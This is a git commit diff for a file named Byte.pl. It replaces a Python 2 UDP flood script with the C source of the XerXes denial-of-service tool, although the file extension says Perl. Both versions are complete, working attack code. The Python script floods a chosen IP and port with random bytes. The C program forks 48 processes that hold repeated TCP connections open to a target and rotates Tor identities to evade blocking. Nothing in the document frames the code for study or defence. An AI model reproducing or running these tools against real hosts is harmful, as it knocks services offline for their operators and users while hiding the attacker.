f27e4b1bac6cbb00fdd323e720019627cc939492
bitch99221-png <72049357+bitch99221-png@users.noreply.github.com>
2020-11-19 22:58:48 -0500

    Update Byte.pl
    Btu

--- Byte.pl
+++ Byte.pl
@@ -1,88 +1,100 @@
-import sys
-import os
-import random
-import socket
-from sys import platform
+/* XerXes - Most powerful dos tool - THN (http://www.thehackernews.com) */
 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <signal.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 
+int make_socket(char *host, char *port) {
+	struct addrinfo hints, *servinfo, *p;
+	int sock, r;
+//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
+	memset(&hints, 0, sizeof(hints));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
+		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
+		exit(0);
+	}
+	for(p = servinfo; p != NULL; p = p->ai_next) {
+		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
+			continue;
+		}
+		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
+			close(sock);
+			continue;
+		}
+		break;
+	}
+	if(p == NULL) {
+		if(servinfo)
+			freeaddrinfo(servinfo);
+		fprintf(stderr, "No connection could be made\n");
+		exit(0);
+	}
+	if(servinfo)
+		freeaddrinfo(servinfo);
+	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
+	return sock;
+}
 
-########################################
-########################################
-# Educational purpose only             #
-########################################
-# I'm not responsible for your actions #
-########################################
-########################################
+void broke(int s) {
+	// do nothing
+}
 
+#define CONNECTIONS 8
+#define THREADS 48
 
+void attack(char *host, char *port, int id) {
+	int sockets[CONNECTIONS];
+	int x, g=1, r;
+	for(x=0; x!= CONNECTIONS; x++)
+		sockets[x]=0;
+	signal(SIGPIPE, &broke);
+	while(1) {
+		for(x=0; x != CONNECTIONS; x++) {
+			if(sockets[x] == 0)
+				sockets[x] = make_socket(host, port);
+			r=write(sockets[x], "\0", 1);
+			if(r == -1) {
+				close(sockets[x]);
+				sockets[x] = make_socket(host, port);
+			} else
+//				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
+			fprintf(stderr, "[%i: Voly Sent]\n", id);
+		}
+		fprintf(stderr, "[%i: Voly Sent]\n", id);
+		usleep(300000);
+	}
+}
 
+void cycle_identity() {
+	int r;
+	int socket = make_socket("localhost", "9050");
+	write(socket, "AUTHENTICATE \"\"\n", 16);
+	while(1) {
+		r=write(socket, "signal NEWNYM\n\x00", 16);
+		fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
+		usleep(300000);
+	}
+}
 
-"""
-Created By: TheTechHacker
-==========================
-SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ
-"""
-
-
-
-if platform == "linux" or platform == "linux2":
-    os.system("clear")
-elif platform == "darwin":
-    os.system("clear")
-    print "This Script Works Best on Kali linux"
-elif platform == "win32":
-    os.system("cls")
-else:
-    print "\033[1;34m [-]Unknown System Detected \033[1;m"
-
-print "\033[1;32m"
-
-connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-print """
-     _      _      _
-    (.)< __(.)> __(.)=
-  \___)  \___)  \___)   Ready To Send
-  
-  
-=======================================
-     Created By: TheTechHacker
-=======================================
-If You Use too much bytes 
-You're Internet might get a bit slow
-=======================================
-"""
-
-
-
-try:
-    size = input("bytes> ")
-    attack = random._urandom(size)
-    ip = raw_input("IP> ")
-    port = input("port> ")
-    print " "
-    print "Lunching Attack"
-    print " "
-except SyntaxError:
-    print " "
-    exit("\033[1;34m ERROR \033[1;m")
-except NameError:
-    print " "
-    exit("\033[1;34m Invalid Input \033[1;m")
-except KeyboardInterrupt:
-    print " "
-    exit("\033[1;34m [-]Canceled By User \033[1;m")
-except ImportError:
-    print " "
-    exit("\033[1;34m [-]Install python 2.7.15")
-
-
-while True:
-    try:
-        connect.sendto(attack, (ip, port))
-        print "Attacking sending bytes ===>"
-    except KeyboardInterrupt:
-        print " "
-        exit("\033[1;34m [-]Canceled By User \033[1;m")
-    except ImportError:
-        print " "
-        exit("\033[1;34m [-]Install python 2.7.15")
+int main(int argc, char **argv) {
+	int x;
+	if(argc !=3)
+		cycle_identity();
+	for(x=0; x != THREADS; x++) {
+		if(fork())
+			attack(argv[1], argv[2], x);
+		usleep(200000);
+	}
+	getc(stdin);
+	return 0;
+}
